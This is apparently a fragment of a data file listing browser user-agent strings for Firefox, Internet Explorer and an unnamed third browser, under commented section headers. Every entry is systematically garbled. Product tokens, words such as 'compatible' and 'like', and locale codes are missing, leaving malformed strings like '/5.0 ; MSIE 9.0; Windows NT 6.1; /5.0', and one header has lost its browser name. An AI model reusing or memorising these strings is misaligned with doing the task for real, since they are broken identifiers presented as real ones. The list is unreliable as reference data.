	"/5.0 Windows; U; Windows NT 5.2; rv:1.7.3 Gecko/20041001 Firefox/0.10.1"
	"/5.0 Windows; U; Windows NT 5.1; rv:1.7.3 Gecko/20041001 Firefox/0.10.1"
	"/5.0 Windows; U; Windows NT 5.1; rv:1.7.3 Gecko/20040913 Firefox/0.10.1"
	"/5.0 Windows; U; Windows NT 5.1; rv:1.7.3 Gecko/20040911 Firefox/0.10.1"
	"/5.0 Windows; U; Windows NT 5.0; rv:1.7.3 Gecko/20041001 Firefox/0.10.1"
	"/5.0 Windows; U; Windows NT 5.0; rv:1.7.3 Gecko/20040913 Firefox/0.10.1"
	"/5.0 Windows; U; Win98; rv:1.7.3 Gecko/20041001 Firefox/0.10.1"
	"/5.0 X11; U; Linux i686; rv:1.7.3 Gecko/20040914 Firefox/0.10"
	"/5.0 X11; U; Linux i686; rv:1.7.3 Gecko/20040913 Firefox/0.10"
	"/5.0 Windows; U; Windows NT 5.1; rv:1.7.3 Gecko/20040913 Firefox/0.10"
	"/5.0 Windows; U; Windows NT 5.0; zh-TW; rv:1.8.0.1 Gecko/20060111 Firefox/0.10"
	"/5.0 Windows; U; Windows NT 5.0; rv:1.7.3 Gecko/20040913 Firefox/0.10"
	"/5.0 Windows; U; Win98; rv:1.7.3 Gecko/20040913 Firefox/0.10"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; rv:1.7.3 Gecko/20040913 Firefox/0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.19 Gecko/20081202 Firefox -2.0.0.19-0etch1"
	"/5.0 X11; U; Gentoo Linux x86_64; pl-PL Gecko Firefox"
	"/5.0 X11; ; Linux x86_64; rv:1.8.1.6 Gecko/20070802 Firefox"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.0.6 Gecko/2009011913  Firefox"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.9.2.20 Gecko/20110803 Firefox"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; rv:1.8.1.16 Gecko/20080702 Firefox"
	"/5.0 Macintosh; U; Intel Mac OS X; -US; rv:1.8.1.13 Gecko/20080313 Firefox"



################################
##    Explorer User Agents    ##
################################
	"/5.0 Windows NT 6.1; WOW64; /7.0; AS; rv:11.0  Gecko"
	"/5.0 , MSIE 11, Windows NT 6.3; /7.0;  rv:11.0  Gecko"
	"/5.0 ; MSIE 10.6; Windows NT 6.1; /5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727 - UNTRUSTED/1.0"
	"/5.0 ; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; /6.0; -IN"
	"/5.0 ; MSIE 10.0; Windows NT 6.1; WOW64; /6.0"
	"/5.0 ; MSIE 10.0; Windows NT 6.1; /6.0"
	"/5.0 ; MSIE 10.0; Windows NT 6.1; /5.0"
	"/5.0 ; MSIE 10.0; Windows NT 6.1; /4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64"
	"/5.0 ; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; /6.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; /6.0"
	"/4.0 ; MSIE 10.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 10.0; Windows 3.1"
	"/5.0 Windows; U; MSIE 9.0; WIndows NT 9.0; -US"
	"/5.0 Windows; U; MSIE 9.0; Windows NT 9.0; -US"
	"/5.0 ; MSIE 9.0; Windows NT 7.1; /5.0"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; WOW64; /5.0; SLCC2;  Center PC 6.0; InfoPath.3; MS-RTC LM 8;  4.7"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; WOW64; /5.0; SLCC2;  Center PC 6.0; InfoPath.3; MS-RTC LM 8;  4.7"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; WOW64; /5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0;  4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; WOW64; /5.0; /12.0.742.112"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; WOW64; /5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727;  Center PC 6.0"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; Win64; x64; /5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727;  Center PC 6.0"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; Win64; x64; /5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0;  4.0;  PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; Win64; x64; /5.0"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0; yie8"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C;  PC 2.0"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0; FunWebProducts"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0; /13.0.782.215"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0; /11.0.696.57"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0 /10.0.648.205"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; -US"
	"/5.0 ; MSIE 9.0; Windows NT 6.0; /5.0; /11.0.696.57"
	"/5.0 ; MSIE 9.0; Windows NT 6.0; /4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; -US"
	"/5.0 ; MSIE 8.0; Windows NT 6.1; /4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; -US"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; -US"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; .NET CLR 2.7.58687; SLCC2;  Center PC 5.0;  3.4;  PC 3.6; InfoPath.3"
	"/5.0 ; MSIE 8.0; Windows NT 5.2; /4.0;  Center PC 4.0; SLCC1; .NET CLR 3.0.04320"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322"
	"/5.0 ; MSIE 8.0; Windows NT 5.0; /4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30"
	"/5.0 ; MSIE 7.0; Windows NT 5.0; /4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652;  OptimizedIE8;ENUS"
	"/4.0 ; MSIE 8.0; Windows NT 6.2; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2;  Center PC 6.0; InfoPath.2; MS-RTC LM 8"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2;  Center PC 6.0; InfoPath.2; MS-RTC LM 8"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727;  Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0;  3.0"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0;  OptimizedIE8;ZHCN"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E /8.0.552.224"
	"/4.0; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1;  Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322;  Toolbar; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322;  Toolbar"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705;  Center PC 3.1;  Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; el-GR"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 5.2"
	"/5.0 MSIE 7.0; Macintosh; U; SunOS; X11; ; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648"
	"/5.0 ; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727;  Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR"
	"/5.0 ; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727;  Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR"
	"/5.0 ; MSIE 7.0; Windows NT 6.0; fr-FR"
	"/5.0 ; MSIE 7.0; Windows NT 6.0; -US"
	"/5.0 ; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727"
	"/5.0 ; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB"
	"/4.79 [] ; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648"
	"/4.0 Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727"
	"/4.0 /4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30"
	"/4.0 /4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1"
	"/4.0 ;MSIE 7.0;Windows NT 6.0"
	"/4.0 ; MSIE 7.0; Windows NT 6.2; Win64; x64; /6.0; .NET4.0E; .NET4.0C"
	"/4.0 ; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8"
	"/4.0 ; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3"
	"/4.0 ; MSIE 7.0; Windows NT 6.1; /6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; .NET4.0C; /12.0.742.100"
	"/4.0 ; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/4.0 ; MSIE 6.01; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows NT 5.1; "
	"/4.0 ; MSIE 6.0b; Windows NT 5.1"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0;  5.0.2.6"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0;  5.0.0.0 ;  ;  ; /4.0"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0;  5.0.0.0"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0"
	"/4.0 ; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914"
	"/4.0 ; MSIE 6.0b; Windows NT 4.0"
	"/4.0 ; MSIE 6.0b; Windows 98;  5.0.0.0"
	"/4.0 ; MSIE 6.0b; Windows 98;  9x 4.90"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/4.0 ; MSIE 6.0b; Windows NT 5.1"
	"/4.0 ; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705"
	"/4.0 ; MSIE 6.0b; Windows NT 4.0"
	"/5.0 Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727"
	"/5.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727"
	"/5.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325"
	"/5.0 ; MSIE 6.0; Windows NT 5.1"
	"/45.0 ; MSIE 6.0; Windows NT 5.1"
	"/4.08 ; MSIE 6.0; Windows NT 5.1"
	"/4.01 ; MSIE 6.0; Windows NT 5.1"
	"/4.0 X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM"
	"/4.0 Windows; MSIE 6.0; Windows NT 6.0"
	"/4.0 Windows; MSIE 6.0; Windows NT 5.2"
	"/4.0 Windows; MSIE 6.0; Windows NT 5.0"
	"/4.0 Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727"
	"/4.0 MSIE 6.0; Windows NT 5.1"
	"/4.0 MSIE 6.0; Windows NT 5.0"
	"/4.0 ;MSIE 6.0;Windows 98;Q312461"
	"/4.0 ; Windows NT 5.1; MSIE 6.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; U; MSIE 6.0; Windows NT 5.1 ;  ;  ; /4.0; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322"
	"/4.0 ; U; MSIE 6.0; Windows NT 5.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; /4.0; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; .NET4.0C; InfoPath.3;  PC 2.0"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; /4.0; GTB6.5;  534; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; SLCC2; .NET CLR 2.0.50727;  Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 5.5b1; Mac_PowerPC"
	"/4.0 ; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0"
	"/4.0 ; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0"
	"/4.0 ; MSIE 5.50; Windows NT; SiteKiosk 4.8"
	"/4.0 ; MSIE 5.50; Windows 98; SiteKiosk 4.8"
	"/4.0 ; MSIE 5.50; Windows 95; SiteKiosk 4.8"
	"/4.0 ;MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1"
	"/4.0 ; MSIE 5.5;"
	"/4.0 ; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2"
	"/4.0 ; MSIE 5.5; Windows NT5"
	"/4.0 ; MSIE 5.5; Windows NT"
	"/4.0 ; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 5.5; Windows NT 6.1; /12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; .NET4.0C"
	"/4.0 ; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 5.5; Windows NT 5.5"
	"/4.0 ; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM"
	"/4.0 ; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322 ;  ;  ; /4.0; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 5.5; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 5.23; Mac_PowerPC"
	"/4.0 ; MSIE 5.22; Mac_PowerPC"
	"/4.0 ; MSIE 5.21; Mac_PowerPC"
	"/4.0 ; MSIE 5.2; Mac_PowerPC"
	"/4.0 ; MSIE 5.2; Mac_PowerPC"
	"/4.0 ; MSIE 5.17; Mac_PowerPC"
	"/4.0 ; MSIE 5.17; Mac_PowerPC Mac OS; "
	"/4.0 ; MSIE 5.16; Mac_PowerPC"
	"/4.0 ; MSIE 5.16; Mac_PowerPC"
	"/4.0 ; MSIE 5.15; Mac_PowerPC"
	"/4.0 ; MSIE 5.15; Mac_PowerPC"
	"/4.0 ; MSIE 5.14; Mac_PowerPC"
	"/4.0 ; MSIE 5.13; Mac_PowerPC"
	"/4.0 ; MSIE 5.12; Mac_PowerPC"
	"/4.0 ; MSIE 5.12; Mac_PowerPC"
	"/4.0 ; MSIE 5.05; Windows NT 4.0"
	"/4.0 ; MSIE 5.05; Windows NT 3.51"
	"/4.0 ; MSIE 5.05; Windows 98; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 5.01; Windows NT;  5.0.0.0"
	"/4.0 ; MSIE 5.01; Windows NT; Hotbar 4.1.8.0"
	"/4.0 ; MSIE 5.01; Windows NT; "
	"/4.0 ; MSIE 5.01; Windows NT; .NET CLR 1.0.3705"
	"/4.0 ; MSIE 5.01; Windows NT"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.2.6; MSIECrawler"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.2.6; Hotbar 4.2.8.0"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.2.6; Hotbar 3.0"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.2.6"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.2.4"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.0.0; Hotbar 4.1.8.0"
	"/4.0 ; MSIE 5.01; Windows NT 5.0;  5.0.0.0"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; SV1"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; Q312461; T312461"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; Q312461"
	"/4.0 ; MSIE 5.01; Windows NT 5.0; MSIECrawler"
	"/4.0 ; MSIE 5.0b1; Mac_PowerPC"
	"/4.0 ; MSIE 5.00; Windows 98"
	"/4.0 ; MSIE 5.0; Windows 98; "
	"/4.0 ; MSIE 5.0; Windows NT;"
	"/4.0 ; MSIE 5.0; Windows NT; ;  5.0.2.6"
	"/4.0 ; MSIE 5.0; Windows NT; ;  5.0.2.5"
	"/4.0 ; MSIE 5.0; Windows NT; ;  5.0.0.0"
	"/4.0 ; MSIE 5.0; Windows NT; ; Hotbar 4.1.8.0"
	"/4.0 ; MSIE 5.0; Windows NT; ; Hotbar 3.0"
	"/4.0 ; MSIE 5.0; Windows NT; ; .NET CLR 1.0.3705"
	"/4.0 ; MSIE 5.0; Windows NT; "
	"/4.0 ; MSIE 5.0; Windows NT"
	"/4.0 ; MSIE 5.0; Windows NT 6.0; /4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 5.0; Windows NT 5.0"
	"/4.0 ; MSIE 5.0; Windows 98;"
	"/4.0 ; MSIE 5.0; Windows 98;  5.0.2.4"
	"/4.0 ; MSIE 5.0; Windows 98; Hotbar 3.0"
	"/4.0 ; MSIE 5.0; Windows 98; ;  5.0.2.6; yplus 1.0"
	"/4.0 ; MSIE 5.0; Windows 98; ;  5.0.2.6"
	"/4.0 ; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607"
	"/4.0 ; MSIE 4.5; Windows 98; "
	"/4.0 ; MSIE 4.5; Mac_PowerPC"
	"/4.0 ; MSIE 4.5; Mac_PowerPC"
	"/4.0 ; MSIE 4.01; Windows CE; PPC; 240x320; :PPC-6700; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows NT"
	"/4.0 ; MSIE 4.01; Windows NT 5.0"
	"/4.0 ; MSIE 4.01; Windows CE; ;PPC-i830; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; ; SCH-i830; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; :SPH-ip830w; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; :SPH-ip320; ; 176x220"
	"/4.0 ; MSIE 4.01; Windows CE; :SCH-i830; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; :SCH-i320; ; 176x220"
	"/4.0 ; MSIE 4.01; Windows CE; :PPC-i830; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; ; 176x220"
	"/4.0 ; MSIE 4.01; Windows CE; PPC; 240x320; :PPC-6700; PPC; 240x320"
	"/4.0 ; MSIE 4.01; Windows CE; PPC; 240x320; PPC"
	"/4.0 ; MSIE 4.01; Windows CE; PPC"
	"/4.0 ; MSIE 4.01; Windows CE"
	"/4.0 ; MSIE 4.01; Windows 98; Hotbar 3.0"
	"/4.0 ; MSIE 4.01; Windows 98; "
	"/4.0 ; MSIE 4.01; Windows 98"
	"/4.0 ; MSIE 4.01; Windows 95"
	"/4.0 ; MSIE 4.01; Mac_PowerPC"
	"/4.0 WebTV/2.6 ; MSIE 4.0"
	"/4.0 ; MSIE 4.0; Windows NT"
	"/4.0 ; MSIE 4.0; Windows 98 "
	"/4.0 ; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 4.0; Windows 95"
	"/4.0 ; MSIE 4.0"
	"/2.0 ; MSIE 4.0; Windows 98"
	"/2.0 ; MSIE 3.03; Windows 3.1"
	"/2.0 ; MSIE 3.02; Windows 3.1"
	"/2.0 ; MSIE 3.01; Windows 95"
	"/2.0 ; MSIE 3.01; Windows 95"
	"/2.0 ; MSIE 3.0B; Windows NT"
	"/3.0 ; MSIE 3.0; Windows NT 5.0"
	"/2.0 ; MSIE 3.0; Windows 95"
	"/2.0 ; MSIE 3.0; Windows 3.1"
	"/4.0 ; MSIE 2.0; Windows NT 5.0; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0"
	"/1.22 ; MSIE 2.0; Windows 95"
	"/1.22 ; MSIE 2.0; Windows 3.1"



################################
##     User Agents      ##
################################
	"/5.0 Windows NT 6.1 /537.36 KHTML,  Gecko /41.0.2228.0 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_10_1 /537.36 KHTML,  Gecko /41.0.2227.1 Safari/537.36"
	"/5.0 X11; Linux x86_64 /537.36 KHTML,  Gecko /41.0.2227.0 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.36 KHTML,  Gecko /41.0.2227.0 Safari/537.36"
	"/5.0 Windows NT 6.3; WOW64 /537.36 KHTML,  Gecko /41.0.2226.0 Safari/537.36"
	"/5.0 Windows NT 6.4; WOW64 /537.36 KHTML,  Gecko /41.0.2225.0 Safari/537.36"
	"/5.0 Windows NT 6.3; WOW64 /537.36 KHTML,  Gecko /41.0.2225.0 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /41.0.2224.3 Safari/537.36"
	"/5.0 Windows NT 10.0 /537.36 KHTML,  Gecko /40.0.2214.93 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_10_1 /537.36 KHTML,  Gecko /37.0.2062.124 Safari/537.36"
	"/5.0 Windows NT 6.3; Win64; x64 /537.36 KHTML,  Gecko /37.0.2049.0 Safari/537.36"
	"/5.0 Windows NT 4.0; WOW64 /537.36 KHTML,  Gecko /37.0.2049.0 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.36 KHTML,  Gecko /36.0.1985.67 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /36.0.1985.67 Safari/537.36"
	"/5.0 X11; OpenBSD i386 /537.36 KHTML,  Gecko /36.0.1985.125 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_9_2 /537.36 KHTML,  Gecko /36.0.1944.0 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /35.0.3319.102 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /35.0.2309.372 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /35.0.2117.157 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.36 KHTML,  Gecko /35.0.1916.47 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /34.0.1866.237 Safari/537.36"
	"/5.0 X11; Linux x86_64 /537.36 KHTML,  Gecko /34.0.1847.137 Safari/4E423F"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /34.0.1847.116 Safari/537.36 "
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 X11; Linux x86_64 /537.36 KHTML,  Gecko /33.0.1750.517 Safari/537.36"
	"/5.0 Windows NT 6.2; Win64; x64 /537.36 KHTML,  Gecko /32.0.1667.0 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_9_0 /537.36 KHTML,  Gecko /32.0.1664.3 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_8_0 /537.36 KHTML,  Gecko /32.0.1664.3 Safari/537.36"
